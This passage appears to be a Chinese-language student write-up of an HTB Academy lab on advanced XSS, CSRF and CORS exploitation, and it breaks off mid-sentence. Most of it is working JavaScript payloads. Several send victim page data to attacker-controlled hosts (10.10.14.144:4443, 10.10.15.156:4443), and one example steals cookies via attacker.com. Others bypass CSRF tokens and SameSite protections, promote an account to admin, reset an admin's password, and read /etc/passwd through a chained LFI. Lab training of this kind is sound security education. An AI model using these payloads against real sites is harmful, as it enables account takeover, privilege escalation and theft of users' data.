    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://172.16.0.2/data.php', true);
    xhr.onload = () =&gt; {
        var exfil = new XMLHttpRequest();
        exfil.open('POST', 'https://10.10.14.144:4443/log', true);
        exfil.setRequestHeader('Content-Type', 'application/json');
        exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
    };
    xhr.send();
&lt;/script&gt;</code></pre>
<p>假设打开负载的受害者与内部 API 处于同一内部网络中，因此可以访问该 API。在这种情况下，受害者的浏览器会在内部网络内发出交叉源请求：</p>
<img alt="Pasted image 20260415180612" src="assets/posts/advanced-xss-csrf/Pasted image 20260415180612.png"/>
<p>响应随后被泄露给攻击者，使得无法公开访问的网页应用数据得以窃取。</p>
<p>此外，攻击者不需要知道错误配置应用运行的 IP 地址和端口，但可以通过尝试请求不同的 IP 地址和端口组合来提升内部网络扫描的负载，直到找到应用。</p>
<p>注意，我们可以通过使用 GET 请求来进行撤离，而不是 POST，从而简化有效载荷，有效载荷类似于以下内容：</p>
<pre><code class="language-html">&lt;script&gt;
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://cors-misconfigs.htb/data.php', true);
    xhr.withCredentials = true;
    xhr.onload = () =&gt; {
        location = 'https://10.10.14.144:4443/log?data=' + btoa(xhr.responseText);
    };
    xhr.send();
&lt;/script&gt;</code></pre>
<p>然而，使用 GET 请求进行数据窃取存在缺点。首先，操控<code>location</code>会导致重定向，使受害者明显意识到 XSS 攻击，因为他们浏览器中显示的网站会发生变化。因此，在后台使用 <code>fetch</code> 或 <code>XMLHttpRequest</code> 发起过滤请求，操作安全效果显著更好。其次，网址长度不是无限的。因此，如果我们试图泄露的数据过大，有效载荷可能会失败。</p>
<h2>通过 CORS 错误配置绕过 CSRF Token</h2>
<p>除了前述攻击向量外，CORS 配置错误还可被利用来绕过 CSRF 防御，实施 CSRF 攻击，即使已实施适当防御。</p>
<p>如果 CORS 配置错误，使会话 cookie 与跨源请求同时发送，即设置了<code>Access-Control-Allow-Credentials</code> ，我们可以有效绕过同源策略。在这种情况下，常见的 CSRF 防御无效，正如本节我们将讨论的那样。</p>
<h3>防御绕过：CSRF Token</h3>
<p>如果我们能因 CORS 配置错误而绕过同源策略，就能访问我们发出的跨源请求的响应。这允许我们向创建有效 CSRF 令牌的端点发送交叉起源请求，读取该令牌，嵌入状态改变的交叉起源请求中，并用有效的 CSRF 令牌发送状态改变的交叉起源请求。由于所有这些都发生在受害者的会话中，即使经过正确检查并绑定到受害者的用户会话，CSRF 令牌仍然有效。</p>
<p>然而，为了让受害者的浏览器发送受害者的会话 Cookie 以及 JavaScript 请求，我们要求易受攻击的网页应用必须明确将 <code>SameSite</code> cookie 属性设置为<code>null</code>,  此外还要处理 CORS 配置错误。根据规范，这仅允许通过<code>secure</code> Cookie 属性传输，该属性仅通过安全 HTTPS 连接实现 Cookie 传输。Cookie 不会通过任何未加密的 HTTP 连接发送。</p>
<p>由于这一限制，示例网页应用及所有其他实验室组件只能通过 HTTPS 访问。如果我们分析网页应用，可以注意到该应用设置了<code>Access-Control-Allow-Origin</code>和<code>Access-Control-Allow-Credentials</code>的 CORS 头部，表明我们应检查 CORS 配置错误。此外，会话 cookie 同时设置了 <code>Secure</code> 和 <code>SameSite=None</code> 这两个 cookie 属性：</p>
<img alt="Pasted image 20260415185929" src="assets/posts/advanced-xss-csrf/Pasted image 20260415185929.png"/>
<p>我们可以分析网页应用对 HTTP <code>Origin</code> 头部不同值的反应。如果我们提供任意值，可以看到网页应用确实配置错误，因为任意起源反映在<code>Access-Control-Allow-Origin</code>的 CORS 首部：</p>
<img alt="Pasted image 20260415190236" src="assets/posts/advanced-xss-csrf/Pasted image 20260415190236.png"/>
<p>我们可以利用 <code>SameSite=None</code> cookie 属性利用 CORS 错误配置，绕过正确的 CSRF 保护，实施 CSRF 攻击。让我们进一步分析该网页应用，以识别此次攻击的潜在目标。</p>
<p>和之前一样，网页应用实现了向管理员推广用户账户的功能。这一次，对应的 POST 请求得到了 CSRF 令牌的妥善保护：</p>
<img alt="Pasted image 20260415190439" src="assets/posts/advanced-xss-csrf/Pasted image 20260415190439.png"/>
<p>我们编写一个漏洞利用，在受害者会话中获取有效的 CSRF 令牌，然后发起相应的跨源请求，迫使受害者提升我们的用户账户为管理员权限。CSRF 令牌是响应向 <code>/profile.php</code> 端点发送的 GET 请求。我们可以提出相应的请求，解析响应，并使用类似以下的 JavaScript 代码提取 CSRF 令牌：</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://bypassing-csrftokens.htb/profile.php', false);
xhr.withCredentials = true;
xhr.send();
var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
var csrftoken = encodeURIComponent(doc.getElementById('csrf').value);</code></pre>
<p>之后，我们可以构建交叉起源请求，用有效的 CSRF 令牌来推广我们的用户：</p>
<pre><code class="language-js">var csrf_req = new XMLHttpRequest();
var params = \`promote=htb-stdnt&amp;csrf=\${csrftoken}\`;
csrf_req.open('POST', 'https://bypassing-csrftokens.htb/profile.php', false);
csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
csrf_req.withCredentials = true;
csrf_req.send(params);</code></pre>
<p>我们可以将这两部分结合起来，在我们的漏洞服务器上得到以下负载：</p>
<pre><code class="language-html">&lt;script&gt;
    // GET CSRF token
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://bypassing-csrftokens.htb/profile.php', false);
    xhr.withCredentials = true;
    xhr.send();
    var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
    var csrftoken = encodeURIComponent(doc.getElementById('csrf').value);

    // do CSRF
    var csrf_req = new XMLHttpRequest();
    var params = \`promote=htb-stdnt&amp;csrf=\${csrftoken}\`;
    csrf_req.open('POST', 'https://bypassing-csrftokens.htb/profile.php', false);
    csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    csrf_req.withCredentials = true;
    csrf_req.send(params);
&lt;/script&gt;</code></pre>
<p>如果我们查看漏洞利用，可以看到一个经过认证的 GET 请求发给 <code>/profile.php</code>，随后是 <code>profile.php</code> 一个带有有效 CSRF 令牌的认证 POST 请求。因此，我们的漏洞应该能奏效。在将邮件送达受害者并等待几秒钟后，我们的用户被提升为管理员。因此，我们成功利用了 CORS 错误配置，绕过了 CSRF 保护，成功实施了 CSRF 攻击：</p>
<img alt="Pasted image 20260415190555" src="assets/posts/advanced-xss-csrf/Pasted image 20260415190555.png"/>
<p>直接在登陆页面进行权限提升</p>
<img alt="Pasted image 20260415194750" src="assets/posts/advanced-xss-csrf/Pasted image 20260415194750.png"/>
<pre><code>POST /login.php HTTP/1.1

Host: bypassing-csrftokens.htb

Content-Length: 42

Content-Type: application/x-www-form-urlencoded



user=htb-stdnt&amp;password=Academy_student%21</code></pre>
<p>使用下面这个发送到目标网站</p>
<pre><code class="language-js">&lt;iframe sandbox="allow-scripts allow-forms"
src="data:text/html,&lt;script&gt;
var x=new XMLHttpRequest();
x.open('GET','https://bypassing-csrftokens.htb/profile.php',false);
x.withCredentials=true;
x.send();

var d=new DOMParser().parseFromString(x.responseText,'text/html');
var t=encodeURIComponent(d.getElementById('csrf_token').value);

var r=new XMLHttpRequest();
r.open('POST','https://bypassing-csrftokens.htb/profile.php',false);
r.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
r.withCredentials=true;
r.send('promote=htb-stdnt&amp;csrf_token='+t);
&lt;/script&gt;"&gt;&lt;/iframe&gt;</code></pre>
<ul><li>服务器允许<code>Origin:null</code>, 所以设置为sandbox, 让这个子页面处于隔离环境.</li></ul>
<pre><code class="language-js"># 服务器允许\`Origin:null\`, 所以设置为sandbox, 让这个子页面处于隔离环境.
&lt;iframe sandbox="allow-scripts allow-forms"

# 内联一个“页面”，直接执行里面的 JS
src="data:text/html,&lt;script&gt;

# 拿 CSRF Token
var x=new XMLHttpRequest();
# false, 同步请求（确保下一步能拿到 response）
x.open('GET','https://bypassing-csrftokens.htb/profile.php',false);
# 带上受害者（admin）的 cookie
x.withCredentials=true;
x.send();

# 把返回的 HTML 转成 DOM, 从里面提取：&lt;input id="csrf_token" value="xxxx"&gt;
var d=new DOMParser().parseFromString(x.responseText,'text/html');
var t=encodeURIComponent(d.getElementById('csrf_token').value);

# 发起 CSRF 提权
var r=new XMLHttpRequest();
r.open('POST','https://bypassing-csrftokens.htb/profile.php',false);
r.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
r.withCredentials=true;
r.send('promote=htb-stdnt&amp;csrf_token='+t);
&lt;/script&gt;"&gt;&lt;/iframe&gt;</code></pre>
<blockquote>admin浏览器被JS控制，自动执行了提权请求</blockquote>
<blockquote>让远端的admin浏览器帮我们的账户提升到admin权限</blockquote>
<h2>其他 CSRF 利用</h2>
<h3>结合攻击向量绕过 SameSite Cookie</h3>
<p>网页浏览器根据请求的来源<code>网站</code>  和目标，决定是否发送 SameSite cookie。这与几节前提到的同源政策所考虑的<code>起源</code>不同。关键区别在于端口和子域名不被视为网站的一部分。因此，即使端口和子域名不同，两个域名仍被视为同一站点，在某些情况下，跨源请求仍被视为同站点。请考虑以下例子：</p>
<ul><li><code>https://vulnerable.htb</code> 和 <code>https://sub.vulnerable.htb</code> 都是 SameSite</li><li><code>https://vulnerable.htb</code> 和 <code>https://vulnerable.htb:9001</code> 都是 SameSite。</li><li><code>https://vulnerable.htb</code> 和 <code>https://sub.vulnerable.htb:9001</code> 都是 SameSite</li></ul>
<ul><li><code>http://vulnerable.htb</code> 和 <code>https://vulnerable.htb</code> 都不是SameSite。</li><li><code>https://vulnerable.htb</code> 和 <code>https://exploitserver.htb</code> _不是_ SameSite。</li></ul>
<p>我们可以利用这种行为绕过 SameSite Cookies 施加的限制。例如，当会话 cookie 将 SameSite 属性设置为 <code>Lax</code> 时，只有在安全请求（如 GET 请求）时才会发送。如果网页应用包含任何通过 GET 请求访问的状态变更端点，SameSite 保护无效。如果所有状态切换操作都使用 POST 请求，但网页应用配置错误，接受 GET 请求，情况相同。</p>
<p>如果必须绕过<code>strict</code>的 SameSite 限制，我们可以将上述错误配置与目标站点的客户端重定向结合起来。如果我们写了一个将受害者发送到客户端重定向端点的有效载荷，客户端重定向是由目标站点发起的，因此被视为 SameSite。因此，即使 SameSite 属性设置为<code>strict</code> ，受害者的 Cookie 也会随请求一起发送。如果我们将受害者重定向到那个接受状态更改操作的 GET 请求的配置错误端点，就可以成功执行 CSRF 攻击。</p>
<blockquote><strong>注意：</strong> 这种绕过仅适用于客户端重定向，不适用于服务器端重定向，如 HTTP 3xx 状态码。</blockquote>
<p>举例来说，考虑以下网页应用，它将会话 Cookie 的 SameSite cookie 属性设置为<code>strict</code> ：</p>
<img alt="Pasted image 20260415202639" src="assets/posts/advanced-xss-csrf/Pasted image 20260415202639.png"/>
<p>有趣的是，网页应用在成功登录后会将我们重定向到一个临时页面，然后该页面又重定向到我们的个人资料：</p>
<img alt="Pasted image 20260415202651" src="assets/posts/advanced-xss-csrf/Pasted image 20260415202651.png"/>
<p>查看源代码，我们可以看到由此产生的重定向是通过 HTML <code>meta</code>标签实现的，这是一种客户端重定向：</p>
<p>此外，我们可以通过<code>user</code>的 GET 参数向 URL 注入额外的 GET 参数，因为 Web 应用似乎在重定向 URL 中复制了该参数：</p>
<img alt="Pasted image 20260415203605" src="assets/posts/advanced-xss-csrf/Pasted image 20260415203605.png"/>
<p>用户配置文件存在几节前讨论的 CSRF 漏洞，使我们可以通过 <code>/profile.php？promote=htb-stdnt</code> 端点推广用户。然而，由于 SameSite 属性设置为<code>严格</code> ，我们之前的负载无法正常工作。相反，我们可以利用客户端重定向来设计成功的 CSRF 漏洞利用。为此，我们必须确保受害者能够访问终端，从而实现客户端重定向。此外，受害者需要被重定向到包含 <code>promote=htb-stdnt</code> GET 参数的 URL 来将用户提升为管理员权限。我们可以通过类似以下载荷实现：</p>
<pre><code class="language-html">&lt;script&gt;
document.location = "https://vulnerablesite.htb/admin.php?user=htb-stdnt%26promote=htb-stdnt";
&lt;/script&gt;</code></pre>
<p>将该有效载荷设置为我们的漏洞利用并传递给受害者，成功执行 CSRF 攻击。随后，我们获得了网页应用的管理员权限。</p>
<p>最后，由于子域名被视为 SameSite，我们可以利用子域名中的 XSS 漏洞绕过 SameSite cookie 的限制。在这种情况下，交叉来源请求被视为 SameSite。因此，受害者的 Cookie 会随请求一起发送，从而成功实施 CSRF 攻击。我们将在后续章节中更详细探讨这一情景。</p>
<p>查看我们的示例网页应用，可以看到它在会话 cookie 上设置<code>SameSite=Strict</code> 属性，防止 Cookie 通过任何跨站请求发送：</p>
<img alt="Pasted image 20260415203729" src="assets/posts/advanced-xss-csrf/Pasted image 20260415203729.png"/>
<p>然而，正如我们之前讨论的，子域名被视为同一网站的一部分。因此，让我们尝试识别可能受到 XSS 影响的子域名。我们可以用 <code>gobuster</code> 来实现：</p>
<pre><code>Chenduoduo@htb[/htb]$ gobuster vhost -k -u https://vulnerablesite.htb -w /path/to/SecLists/Discovery/DNS/subdomains-top1million-20000.txt

&lt;SNIP&gt;
===============================================================
2023/08/26 12:09:40 Starting gobuster in VHOST enumeration mode
===============================================================
Found: guestbook.vulnerablesite.htb (Status: 200) [Size: 2317]
                                                              
===============================================================
2023/08/26 12:09:43 Finished
===============================================================</code></pre>
<p>通过查看子域名 <code>https://guestbook.vulnerablesite.htb</code>，我们可以识别出几节前提到的留言簿网页应用。我们可以确认，同样的 XSS 漏洞依然存在：</p>
<img alt="Pasted image 20260415203947" src="assets/posts/advanced-xss-csrf/Pasted image 20260415203947.png"/>
<p>假设监控留言簿条目的管理员也在 <code>https://vulnerablesite.htb</code> 登录主应用程序，我们可以利用该 XSS 漏洞绕过 SameSite 限制，让管理员将我们的用户晋升为管理员。为此，我们需要强制管理员用户发送相应的 POST 请求，这可以通过以下 XSS 负载实现：</p>
<pre><code class="language-html">&lt;script&gt;
    var csrf_req = new XMLHttpRequest();
    var params = 'promote=htb-stdnt';
    csrf_req.open('POST', 'https://vulnerablesite.htb/profile.php', false);
    csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    csrf_req.withCredentials = true;
    csrf_req.send(params);
&lt;/script&gt;
</code></pre>
<p>在将我们的负载发布到留言簿并等待管理员用户访问页面几秒钟后，我们可以看到 CSRF 攻击成功，我们的用户已被晋升：</p>
<img alt="Pasted image 20260415204018" src="assets/posts/advanced-xss-csrf/Pasted image 20260415204018.png"/>
<h3>弱 Token 爆破</h3>
<p>正如<code>Session Security</code>模块中简要讨论的，弱 CSRF 令牌可以通过绕过以成功发动 CSRF 攻击。当 CSRF 令牌未绑定到用户会话时，可以进行简单绕过。在这种情况下，攻击者访问受损的网络应用时，可以从自己的会话向交叉源请求添加有效的 CSRF 令牌。后端随后会接受来自受害者会话的交叉起始请求，因为 CSRF 令牌有效。另一个例子是 CSRF 代币并非完全随机，使其可预测。根据 CSRF 令牌的创建方式（比如用户名的哈希值或当前时间戳），我们可能能一次性猜测，或者用有效载荷暴力破解。</p>
<p>这一次，网页应用已用 CSRF 令牌保护，因此普通的 CSRF 攻击将不再成功。然而，如果我们获得多个 CSRF 令牌，可以推断这是一个递增的数字，可能类似于计数器，因此可以暴力破解：</p>
<img alt="Pasted image 20260415204116" src="assets/posts/advanced-xss-csrf/Pasted image 20260415204116.png"/>
<p>如果我们更仔细地分析 CSRF tokens，可以发现 CSRF 代币仅仅是作为 Unix 时间戳的当前时间。这使得 CSRF 令牌具有可预测性，并允许我们创建可行的漏洞来执行 CSRF 攻击。为此，我们必须正确猜测受害者的 CSRF 令牌，即受害者在访问我们的有效载荷前最后一次访问 <code>/profile.php</code> 端点的时间。由于默认 SameSite <code>Lax</code> 策略的限制，我们无法用 JavaScript 代码动态暴力破解 CSRF 令牌，因此很难精确掌握时机。因此，我们需要在 HTML 表单中硬编码猜测的 CSRF 令牌，并更新每个猜测的值：</p>
<pre><code class="language-html">&lt;html&gt;
  &lt;body&gt;
    &lt;form method="GET" action="https://vulnerablesite.htb/profile.php"&gt;
      &lt;input type="hidden" name="promote" value="htb-stdnt" /&gt;
      &lt;input type="hidden" name="csrf" value="1692981700" /&gt;
      &lt;input type="submit" value="Submit request" /&gt;
    &lt;/form&gt;
    &lt;script&gt;
      document.forms[0].submit();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>虽然这使得暴力破解 CSRF 令牌更具挑战性，从而降低了成功攻击的可能性，但预测有效的 CSRF 令牌并绕过弱保护是可行的。</p>
<ol><li>先加 hosts：</li></ol>
<pre><code>echo '10.129.66.205 misc-csrf.htb exploitserver.htb' | sudo tee -a /etc/hosts</code></pre>
<ol><li>登录：</li></ol>
<pre><code>https://misc-csrf.htb/login.php  
user: htb-stdnt  
pass: Academy_student!</code></pre>
<ol><li>这题的绕过点不是普通跨站直接打 <code>/profile.php</code>，而是利用 <strong>客户端重定向</strong> 绕过 <code>SameSite=Strict</code>。课程材料里给的思路就是：让受害者先访问一个会发生<strong>客户端重定向</strong>的端点，并把 <code>promote=htb-stdnt</code> 注入到最终跳转的 URL 里，这样后续请求会被当成 SameSite，请求里会带上管理员 cookie，从而完成 CSRF。</li></ol>
<ol><li>在 exploit server 的 <code>/exploit</code> 里保存这个 payload：</li></ol>
<pre><code>&lt;script&gt;  
document.location = "https://misc-csrf.htb/admin.php?user=htb-stdnt%26promote=htb-stdnt";  
&lt;/script&gt;</code></pre>
<ol><li>然后打开：</li></ol>
<pre><code>https://exploitserver.htb/deliver</code></pre>
<p>选择目标：</p>
<pre><code>misc-csrf.htb</code></pre>
<p>点 <code>Deliver</code>。</p>
<ol><li>等几秒，再回：</li></ol>
<pre><code>https://misc-csrf.htb/profile.php</code></pre>
<p>权限已经变成 admin。</p>
<h2>XSS 利用</h2>
<p>我们可以利用跨站脚本 (XSS) 漏洞发起 HTTP 请求，获取其响应，并将数据泄露到我们控制的服务器。因此，我们可以精心构造 XSS 攻击载荷，发起跨域请求，并将 XSS 与 CSRF 攻击载荷结合使用，从而实施一种对受害者所在内部网络构成威胁的攻击技术。</p>
<p>此外，如果未显式设置 SameSite 属性，Web 浏览器通常会强制执行 cookie 的 SameSite 策略，这<code>Lax</code>大大限制了 CSRF 攻击的可能性。因此，将 XSS 和 CSRF 结合起来是一种强大的攻击技术。</p>
<p><strong>HttpOnly Cookie flag</strong> 窃取受害者会话 Cookie 是威胁行为者利用 XSS 漏洞最广泛利用的手段。然而，通过使用会话 cookie 上的 <code>HttpOnly</code> 属性，可以防止这种技术。该属性阻止 JavaScript 代码访问该 Cookie。 更具体地说，如果我们访问 <code>document.cookie</code>，带有 <code>HttpOnly</code> 属性的 Cookie 将不存在，这实际上防止了受害者会话 cookie 被窃取。然而，这并不一定减轻 XSS 漏洞的严重性。由于 XSS 允许我们在受害者的浏览器中，在易受攻击的网络应用中执行任意 JavaScript 代码，并且在受害者的上下文中，我们可以执行与知道会话 Cookie 相同的操作。然而，我们需要编写一个 XSS 负载来代表我们执行相应的操作，而不是在浏览器中设置受害者会话 Cookie 后手动操作。</p>
<p><strong>Exfiltrating Data with XSS</strong></p>
<p>XSS攻击的payload是在受害者浏览器或用户环境中执行, 使得攻击者可以获得从受害者视角访问的数据. 低权限攻击者可以利用XSS漏洞获取对受害者应用的管理访问权想, 前提是受害者有管理权限. 我们可以利用这一点, 从网页应用中窃取任意数据.</p>
<p>为了访问受害者上下文中的信息并将信息泄露到我们的泄露服务器，我们可以使用 <a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest" rel="noreferrer" target="_blank">XMLHttpRequest</a> 对象，这使我们能够发送 HTTP 请求并与响应互动。</p>
<p>我们的示例网页应用是我们之前见过的同款留言簿应用。同样的 XSS 漏洞依然存在。不过这次，会话 Cookie 设置了 <code>HttpOnly</code> 标志，防止我们窃取：</p>
<img alt="Pasted image 20260418042747" src="assets/posts/advanced-xss-csrf/Pasted image 20260418042747.png"/>
<blockquote>设置了<code>HttpOnly</code>的Cookie, 不能被<code>document.cookie</code>读取, 不能被任何前端JS访问.</blockquote>
<blockquote>例如, 常见的窃取方式是XSS, <code>new Image().src="http://attacker.com/?c="+document.cookie</code></blockquote>
<blockquote><code>HttpOnly</code>阻断的是从浏览器脚本到Cookie的读取路径.</blockquote>
<p>假设受害者是管理员，我们应从他们的视角审视网页应用，以确定其中是否有仅对管理员可见的功能。为此，让我们访问受害者上下文中已知的端点，并对我们的撤资服务器进行响应。为此，我们可以在留言簿中创建包含以下 XSS 有效载荷的条目：</p>
<pre><code>&lt;script src="https://exploitserver.htb/exploit"&gt;&lt;/script&gt;</code></pre>
<p>之后，我们可以利用漏洞利用服务器来写入 XSS 负载。我们将使用一个简单的有效载荷，访问 <code>/home.php</code> 端点并将 base64 编码的响应导出给窃取服务器：</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
xhr.open('GET', '/home.php', true);
xhr.withCredentials = true;
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send();</code></pre>
<p>等待受害者触发我们的负载后，我们将在撤离服务器收到 base64 编码的响应：</p>
<pre><code class="language-shell">Chenduoduo@htb[/htb]$ python3 server.py 

Serving HTTPS on 0.0.0.0 port 4443 (https://0.0.0.0:4443/) ...
10.129.136.40 - - [30/Nov/2025 12:36:37] "OPTIONS /log HTTP/1.1" 200 -
10.129.136.40 - - [30/Nov/2025 12:36:37] [i] POST body: {"data":"CjwhRE&lt;SNIP&gt;Ww+"}
10.129.136.40 - - [30/Nov/2025 12:36:37] "POST /log HTTP/1.1" 200 -</code></pre>
<p>解码响应后，我们可以分析它是否与低权限用户在 <code>/home.php</code> 端点访问的内容有差异。我们可以发现，在回复的导航部分，/<code>admin.php</code> 有对管理员仪表盘的引用，但在我们用户的上下文中没有：</p>
<img alt="Pasted image 20260418043458" src="assets/posts/advanced-xss-csrf/Pasted image 20260418043458.png"/>
<p>让我们通过调整漏洞服务器的负载，将/<code>admin.php</code> 端点改为窃取，从而窃取管理员仪表盘，包括任何潜在敏感数据：</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin.php', true);
xhr.withCredentials = true;
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send();</code></pre>
<p>我们不会在留言簿上发布新条目，因为管理员会定期访问留言簿，每次都会触发我们的 XSS 负载。由于这会触发从漏洞利用服务器加载的有效载荷代码，修改利用代码即可。这使我们能够提取整个管理仪表盘，包括管理员访问的所有信息：</p>
<img alt="Pasted image 20260418043537" src="assets/posts/advanced-xss-csrf/Pasted image 20260418043537.png"/>
<pre><code class="language-js"># 创建一个新的http请求对象
var xhr = new XMLHttpRequest();
# 请求方法, 访问路径, 异步请求(发请求时不会卡住整个页面, 请求完成后执行回调函数) 
xhr.open('GET', '/admin.php', true);
# 让浏览器在这个请求里自动带上当前站点的凭据(Cookie, session, 认证信息等)
xhr.withCredentials = true;

# 定义一个回调函数, onload, 表示加载完成时触发
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    # 因为接下来发送的内容是JSON格式, 所以需要定义Content-Type
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send();</code></pre>
<p><code>exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));</code></p>
<ul><li><code>xhr.responseTest</code>: 表示前面那个<code>xhr</code>请求拿到的响应正文, 也就是admin.php返回的html内容</li><li><code>btoa()</code>: 进行base64编码</li><li><code>JSON.stringify(...)</code>: 把上面的 JS 对象转成 JSON 字符串。例如变成：<code>{"data":"QWxhZGRpbjpvcGVuIHNlc2FtZQ=="}</code></li><li><code>exfil.send(...)</code>: 执行发送命令</li></ul>
<h2>从受害者会话发起攻击</h2>
<p>在讨论如何从带有 XSS 漏洞的受害者用户上下文中窃取数据后，我们将探讨如何触发可能改变状态的操作。由于 XSS 赋予我们对受害者会话的完全控制，我们可以在受害者用户上下文中触发网页应用实现的任何功能。这可能导致受害者账户被完全接管，或助长进一步攻击。</p>
<p><strong>账户接管</strong> 这一次，我们的示例网页应用包含了更新用户资料的功能，包括用户密码：</p>
<img alt="Pasted image 20260418060231" src="assets/posts/advanced-xss-csrf/Pasted image 20260418060231.png"/>
<p>更新配置文件通过以下 HTTP 请求实现：</p>
<img alt="Pasted image 20260418152825" src="assets/posts/advanced-xss-csrf/Pasted image 20260418152825.png"/>
<p>由于更新账户密码不需要使用旧密码，我们可以利用已知的 XSS 漏洞更改受害者的密码。这使我们能够登录受害者的账户，从而完全接管他们的账户。表单通过 CSRF_token保护，但由于存在 XSS 漏洞，我们可以读取 CSRF 令牌并将其添加到请求中。</p>
<p>为此，我们使用之前章节中使用的同样的 XSS 漏洞，从漏洞服务器加载 JavaScript 代码：</p>
<pre><code class="language-html">&lt;script src="https://exploitserver.htb/exploit"&gt;&lt;/script&gt;</code></pre>
<p>之后，我们可以向 <code>/home.php</code> 发送 GET 请求，获取有效的 CSRF 令牌，提取它，然后发起 POST 请求，将受害者的密码改为 <code>pwned</code>。</p>
<pre><code class="language-js">// GET CSRF token
var xhr = new XMLHttpRequest();
xhr.open('GET', '/home.php', false);
xhr.withCredentials = true;
xhr.send();
var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
var csrftoken = encodeURIComponent(doc.getElementById('csrf_token').value);

// change PW
var csrf_req = new XMLHttpRequest();
var params = \`username=admin&amp;email=admin@vulnerablesite.htb&amp;password=pwned&amp;csrf_token=\${csrftoken}\`;
csrf_req.open('POST', '/home.php', false);
csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
csrf_req.withCredentials = true;
csrf_req.send(params);</code></pre>
<p>等待管理员用户触发 XSS 后，我们可以用 <code>admin:pwned</code> 的凭证登录受害者账户。</p>
<p><strong>链式漏洞, Chaining Vulnerabilities</strong> 如上所述，我们可以利用 XSS 漏洞，从受害者的用户上下文中触发 Web 应用中的任何功能。我们可以更进一步，通过利用 Web 应用中只有受害者能访问的端点上的不同漏洞，串联多个漏洞。</p>
<p>为此，我们首先需要从受害者的角度分析网络应用，识别受害者能够访问但我们自己账户无法访问的端点，最后，通过我们的 XSS 负载测试和利用发现的任何漏洞。</p>
<p>我们将再次使用与利用服务器上自定义漏洞利用的基础 XSS 负载相同的内容：</p>
<pre><code>&lt;script src="https://exploitserver.htb/exploit"&gt;&lt;/script&gt;</code></pre>
<p>从受害者的用户上下文中窃取 <code>/home.php</code> 端点会暴露出端点/<code>admin.php</code>，而我们的用户无法访问：</p>
<img alt="Pasted image 20260418153117" src="assets/posts/advanced-xss-csrf/Pasted image 20260418153117.png"/>
<p>为了识别管理员端点显示的数据，我们可以使用上一节中使用的相同负载来导出响应：</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin.php', true);
xhr.withCredentials = true;
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.14.144:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send();</code></pre>
<p>这揭示了以下 HTML 回复：</p>
<img alt="Pasted image 20260418153143" src="assets/posts/advanced-xss-csrf/Pasted image 20260418153143.png"/>
<p>分析 HTML 源代码后，管理员端点似乎支持 GET 参数<code>视图</code> ，可以设置到当前工作目录中的不同文件。这是本地文件包含（LFI）漏洞的明显切入点。为了验证我们的假设，让我们调整载荷以包含文件 <code>/etc/passwd</code>：</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin.php?view=../../../../etc/passwd', true);
xhr.withCredentials = true;
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.14.144:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send();</code></pre>
<p>等待受害者再次触发 XSS 漏洞后，我们收到以下对撤离服务器的回复，其中包含我们泄露的文件：</p>
<img alt="Pasted image 20260418153219" src="assets/posts/advanced-xss-csrf/Pasted image 20260418153219.png"/>
<blockquote><strong>注：</strong> 我们可以将 HTML 代码保存到本地文件中，并在网页浏览器中打开以显示页面。我们可能需要泄露更多文件，比如脚本文件或样式表，以正确渲染页面。</blockquote>
<h2>枚举内部 API</h2>
<p>正如我们所见，我们可以利用 XSS 漏洞在受害者的用户上下文中触发特定功能，并窃取受害者有权访问的数据。然而，由于 XSS 有效载荷是在受害者的浏览器中执行的，因此它也使我们能够攻击仅在受害者私有网络内可访问的其他 Web 应用程序。</p>
<p><strong>识别内部API</strong> 我们的攻击将以与前几节相同的方式开始。我们将首先把基础 XSS 有效载荷作为留言簿条目发布：</p>
<pre><code class="language-html">&lt;script src="https://exploitserver.htb/exploit"&gt;&lt;/script&gt;</code></pre>
<p>之后，我们将提取管理员端点，以识别可能对管理员有用的功能：</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin.php', true);
xhr.withCredentials = true;
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send();</code></pre>
<p>由此可得出以下结论：</p>
